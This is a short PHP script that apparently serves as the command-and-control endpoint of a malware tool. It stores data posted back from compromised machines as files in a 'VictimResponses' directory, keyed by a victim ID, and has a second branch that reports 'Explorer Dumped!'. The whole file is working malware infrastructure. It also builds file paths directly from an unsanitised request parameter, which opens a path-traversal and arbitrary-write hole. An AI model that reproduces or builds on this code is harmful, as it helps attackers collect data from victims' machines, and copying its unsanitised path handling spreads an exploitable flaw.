<?php
	if(isset($_GET["uid"]) && isset($_POST["resp"])) {
		$uid=$_GET["uid"];
		$resp=$_POST["resp"];
		$file=fopen("VictimResponses/$uid"."f.resp", "w");
		fwrite($file, $resp);
		fclose($file);
		print("Success!");
	}
	elseif (isset($_POST["uid"])) {
		$uid=$_POST["uid"];
		$file=fopen("VictimResponses/$uid"."f.resp", "w");
		fwrite($file, "");
		fclose($file);
		print("Explorer Dumped!");
	}
	else
		print "Insufficient Parameters";
?>